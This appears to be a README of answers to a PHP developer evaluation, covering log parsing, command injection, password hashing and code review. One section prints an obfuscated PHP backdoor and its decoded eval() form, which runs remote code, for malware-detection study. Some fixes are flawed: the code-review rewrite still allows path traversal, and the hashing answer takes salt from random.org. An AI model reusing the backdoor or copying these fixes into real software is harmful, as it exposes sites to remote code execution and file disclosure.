# php_evaluation

<h2>1- PHP basics</h2>

<b>Our applications generate a lot of logs. Some times we need to write quick PHP scripts to parse them and generate simple reports. If you get a HTTP log file from one of your sites, can you do a quick PHP script to read/parse the results and generate a simple report from it? Nothing fancy, but it would need to list the total number of entries found, how many of them were errors or success (based on the HTTP return code), what files were visited more often and the most popular referers (and their %'s too).

Bonus: List the top user agents (and their %'s) and try to separate any malicious request from the "good" ones.</b>

See file 'http_log_parser.php', which contains a class for parsing an HTTP log. Calling the <code>get_stats()</code> method on the class object, with the path to the logfile you wish to parse, will return an array containing the requested data, which can be used to populate a report in the desired format.

<h2>2-PHP code analysis</h2>

<b>You are working on a specific code base and you see this entry:

<pre><code>    if(isset($_POST['email']))
    {
        $email_input = trim(htmlspecialchars($_POST['email']));
        // Run email command to notify user of account creation
        system("/opt/app/accounts/notifynew.sh $email_input");
    }
</code></pre>

Do you see any performance or security issue in there? Would you re-write it? Why? How?</b>

From a performance standpoint, the call to <code>isset</code> is probably unnecessary, because the snippet should only run if $_POST['email'] is 
a single valid email address, which an empty input would fail on a validation test. Unless notifynew.sh specifically requires
html entities to be converted, it is unnecessary to call <code>htmlspecialchars</code>. However, it should be noted that there are characters that are valid in an email address, specifically including $, that are not addressed by <code>htmlspecialchars</code> and that
would potentially be interpreted by bash as indicating a variable, so we should take care to escape the shell argument properly.

Security-wise, this script is subject to an email header injection attack, as it receives a $_POST value and does not perform any 
validation to verify that the supplied input is a single, valid email address. In addition, it is theoretically possible for a 
malicious user to trick the system into executing an arbitrary command by concatenating that command onto the end of the email
address with a semicolon.

I would rewrite the code snippet as follows:

<pre><code>$email_input = filter_var(trim($_POST['email']),FILTER_VALIDATE_EMAIL);
if ($email_input !== false) {
    // Run email command to notify user of account creation
    system('/opt/app/accounts/notifynew.sh '.escapeshellarg($email_input));
}
</code></pre>

For additional security we should probably bump the email up against the user database to make sure it's valid. I have a bit of
trepidation about calling an email-sending bash script from PHP, so I would probably not set it up this way to begin with, but 
with appropriate security protocols it should be fine. (My preference would be to call a PHP class that facilitates SMTP through
an actual email account, which would require password validation and would permit outbound spam screening. Any non-email functions
in notifynew.sh could still be handled by calling that script. This has the benefit of preventing the server from acting as an open
or semi-open relay.)

<h2>3-PHP decoding</h2>

<b>Some times to write code to detect malware, we also need to be able to decode them. Can you decode this piece of text and let us know what it does? What would you do to automate decoding them when parsing a PHP file?

<pre><code>/*amOmMQfUYVN0OxwwRjomMCHT1A0KOZXoCl
2wjQHwPWkBI2lxexzlHpmH12gOgizxwrkV
INEsONk1AEozqvfS3WJZkp8aduIDGFvOS18hDhXDmC4S
kqvuFWaCx4x674BsHUiF2lmPoORhhF8Hws32FS
LrxIkz1sJZxBAaQpoiNLoKTa3MR9eM1q4ozedpNmEBnFb5uG
*/
//miBy10TC1A7ezb8fokkqNqHIaOlZhthJ
$IPwXsveV='p'. 'reg_replac'.'e'; $ivAqSMVn="rbjfxy6ilF1hhrbHIo3"^"\x5d\x1b\x22\x02\x283c9\x2b3y\x0c\x1b\x1a\x2e\x10\x04\x40V"; $IPwXsveV($ivAqSMVn, "P2aIsq04NK9Ymr8IIz6AuNiV8WclRl6hcVpKCoEPyDnbulj3ae4Lrchpy0RGkMnDhTNk8S1wVeNGFx0fR4r0VOpKN7QyI42qMFQKXG8skLyp9xLQr4QCH6MV2cJAWAqjF8udDrLo4AU3ygIfZZhgUu3MMBMjC3IHz3l4kwhdx3VmYeHx4pU"^"5D\x00\x25\x5bSYRf\x22J\x2a\x08\x06\x10\x15\x15\x5ei\x13\x30\x1f\x3c\x13k\x038K1\x04\x115JvVmcG\x284Ll2\x3eQ38v\x30\x30q\x1f\x268O\x13\x11\x17\x0fnKpSdO\x60\x2dX\x0a7\x05N2Wws\x7fOQ\x044V\x40UezAy\x2d\x072\x1a\x2d\x02\x0b\x14\x7eaxk\x7ea\x18\x1a\x18\x3f\x1c\x04\x11\x24\x10u\x2df\x14\x12\x 1ds\x1e\x02iD\x3a\x29\x27\x1e\x12\x05\x22\x5dR9m\x5bl\x14\x14\x24\x23R\x15O\x15\x3a\x7e\x05\x3a\x22\x04\x20v\x1e\x19\x 19j\x1a\x2bC\x16\x2b\x15W\x09\x136\x5eSD\x1dK\x3f\x19qLsXIR\x7c", "yHdPJUPGuHdshLXM");
</code></pre></b>

The first section (between /* and */) is a comment that won't be executed.  Likewise, the next line (beginning //) is a 
comment and won't be executed.  The next line assigns the function name <code>preg_replace</code> to variable <code>$IPwXsveV</code>. 
The next command uses the bitwise XOR (^) operator to assign a value to variable <code>$ivAqSMVn</code> that evaluates to 
<code>/yHdPJUPGuHdshLXM/e</code>. This is a Regex that includes the PHP-specific modifier <code>e</code>, which causes the resulting
string to run as PHP code. The next command calls <code>preg_replace</code> as a variable function, with the pattern as the value
of <code>$ivAqSMVn</code>, the subject as <code>yHdPJUPGuHdshLXM</code>, and the replace as another XOR result that evaluates to:

<code>eval("if(isset(\\$_REQUEST['ch']) && (md5(\\$_REQUEST['ch']) == '4c32d49d29497abfb2e3512c0ccd69e3') && isset(\\$_REQUEST['php_code'])) { eval(\\$_REQUEST['php_code']); exit(); }")</code>

This command will run automatically.  <code>$_REQUEST</code> is a superglobal variable that includes the contents of 
<code>$_GET</code>, <code>$_POST</code>, and <code>$_COOKIE</code>.  This allows the script to be called via GET or POST with 
a php_code payload that will execute as long as <code>$_GET['ch']</code> has a value that evaluates to an MD5 hash as specified 
above. That script would be able to execute malicious code.

Automating the decoding of malware is a tall order. One basic approach to the process involves the following steps:

<ol>
<li>Parse the source PHP code by creating a parse tree that abstracts the syntax in the source code into an array that can
be read, item by item. This is different from run-time parsing of the code; we'll read in the file itself as text.</li>
<li>Traverse the parse tree, checking for variable assignments and evaluating the right-hand expressions that can be safely 
evaluated (such as the XOR operations in the example) and/or de-obfuscated using functions like <code>base64_decode()</code>, 
<code>gzinflate()</code>, <code>gzuncompress()</code>, <code>strrev()</code>, and others.</li> 
<li>When a function call is detected, de-obfuscate it if necessary (such as by substituting the underlying function call for
a variable function call). If the function call is one that's useful in malware, such as <code>eval()</code>, examine the 
arguments, substituting de-obfuscated values (such as were identified in part 2 above).</li>
<li>Once the code has been de-obfuscated to the maximum extent possible through the automated system, output the 
de-obfuscated code for evaluation by a human being.  This code should be pretty-printed to aid in the process.</li></ol>


<h2>4-Secure Coding practices</h2>

<b>When building a authentication system, how would you store the user passwords? Let's say we have a form to create an account and that is passing the user + pass via POST:

<pre><code>
    $_POST['user']
    $_POST['pass']
</code></pre>

Now we need a function to store them securely. How would you do that function?</b>

I would not store passwords at all.  I would hash the password in the following manner:

<ol><li>With a strong random number generator (such as is available via random.org), generate salt of at least 16 bytes.</li>
<li>Use the PBKDF2 algorithm to perform key stretching with the salt plus the password, and using a (currently) secure core 
hash like HMAC-SHA-256.</li>
<li>Run a large number of iterations (perhaps 40,000 or more, a number that will need to increase over time).</li>
<li>Take a snippet of the output (minimum 32 bytes) from PBKDF2 to use as the reference hash.</li>
<li>Store the reference hash, the salt, and the iteration count in the database.</li></ol>

With the reference hash, the salt, and the iteration count, we can validate passwords by comparing the computed hash of the
authentication password (with salt and the require number of iterations) to the reference hash stored in the database. 
Open-source code for this process is available as freeware.

<h2>5-Dev ops</h2>

<b>You just pushed some changes to the server and now all pages are giving a 503 (internal server error). What steps would you 
take to fix the error and understand what is going on?</b>

HTTP/1.1 503 indicates "Service Unavailable." The given context suggests overloading of the server because of buggy code that 
has consumed essentially all of the resources of the server.  It should be noted that even though all pages are giving a 
503 error, the problem is likely in one or more of the scripts that were changed.  (It's possible, though not likely, that another
cause arose at the same time as the changes were pushed to the server.) To identify and fix the error:

<ol><li>If this is a production server, roll back the code to the last good commit (and shame on you for pushing untested code to
a production server). If the site begins returning 200 again, you've ruled out external issues like bandwidth throttling.</li>
<li>Assuming this is not a production server and you have command-line access, run the following command to identify the 
process that's consuming the CPU:

<code>% top</code>

or
 
<code>% ps -e -o %cpu,comm,cputime --sort %cpu</code>

This will help us understand whether it's the PHP binary, the database server, or some other process that's maxing out the 
server&mdash;which allows us to focus the search on PHP code that affects those processes. It might also be necessary to kill 
the offending process to restore functionality even with a rollback.</li>
<li>Using the information obtained at step 2, if any, examine the code that was changed, looking for function calls or subroutines 
that won't terminate, database calls that involve huge volumes of data, or other bugs that might cause system resources to be 
over-consumed.  To assist, you might consider setting the error reporting to the highest available level.  You might also consider 
rolling back individual scripts, one at a time, to see if the problem goes away, in order to isolate the offending script.</li>
<li>If step 3 does not identify the problem, or if it does not isolate the specific bad code, use dummy inputs and isolate 
each of the specific functions or code snippets that were changed into their own scripts to see if they return properly.</li></ol>

<h2>6-Code review</h2>

<b>Do you see anything wrong with this code? It was found inside a php file that we were reviewing.

<pre><code>    if(isset($_GET['page']))
    {
        $_GET['page'] = htmlspecialchars($_GET['page']);
        echo '<title>'.$_GET['page'].'</title>';
    }
    else
    {
        $_GET['page'] = "index";
        echo '<title>Welcome to site </title>';
    }

    $content = file_get_contents("/site/content/".$_GET['page']);
    echo htmlspecialchars($content);
    ..</code></pre>

If there is an issue, how would you fix it?</b>

It's not entirely clear what the developer is trying to accomplish with this code.  It looks like the point is to serve 
content from a location outside the web-accessible tree, which introduces some potential security issues, but without 
knowing more about the operational setup, I'm not sure what if anything might need to be adjusted to account for those
security issues. It also looks like the point is to present the underlying code in the content, rather than presenting 
HTML (which the browser will parse). If there are HTML special characters in the filename those will need to be escaped 
for the title presentation, but probably not for the filename itself. 

It's generally a bad practice to write to the $_GET superglobal, which is designed to be populated with key-value pairs 
from an HTTP GET request. (I'm not even entirely sure that it's <i>possible</i> to write to $_GET; I've never tried it.) 
It's also a good idea to test for the existence of the file; otherwise, the code will throw an error.  I'd rewrite the 
code as follows:

<pre><code>    if ($page = $_GET['page']) {
        echo '<title>'.htmlspecialchars($page).'</title>';
    } else {
        $page = 'index';
        echo '<title>Welcome to site </title>';
    }

    if (is_readable("/site/content/".$page)) {
        echo htmlspecialchars(file_get_contents("/site/content/".$page));
    } else {
        echo "File $page not found.";
    }</code></pre>

<h2>7- Regex</h2>

<b>Say you are a firewall analyst and you need to block all access to these 3 vulnerable URLs: 
"/admin/scripts/vuln.php", "/admin/scripts/unsafe.php" and "/admin/lib/blocked.php" 
What Regex (regular expression) would you use to block it?

What if you have 1,000 different paths to block? What steps would you take?</b>

The Regex that covers the three vulnerable URLs, and only those, is:

<code>/\/admin\/(scripts\/(vuln|unsafe)|lib\/blocked).php/</code>

The point of regular expressions is to match patterns in an efficient manner. Efficient grouping is the key--if all of the 
vulnerable URLs can be put into one or more directories (with or without subdirectories) that do not have any non-vulnerable 
URLs, then writing a Regex that would cover those would be easy&mdash;and the time tradeoff for refactoring the file system 
might be worth it in terms of the overhead savings on the firewall. Alternatively, a naming convention that uniformly segregates
the files that need blocking from those that do not would aid the use of Regex at the firewall level.

If that's not practical, we might choose to block each individual path through file permissions (assuming a *nix system). 
By setting the permissions to octal <code>000</code>, only root would have the ability to read or write to the file (although the owner 
of the file could change the permissions, so we might want to <code>chown</code> them to root as well).  (This would render those
files essentially useless, but you did say that you wanted to block ALL access to those URLs.) If we're trying to protect those 
pages from being served by Apache, we could use .htaccess to deny web server access to the files.

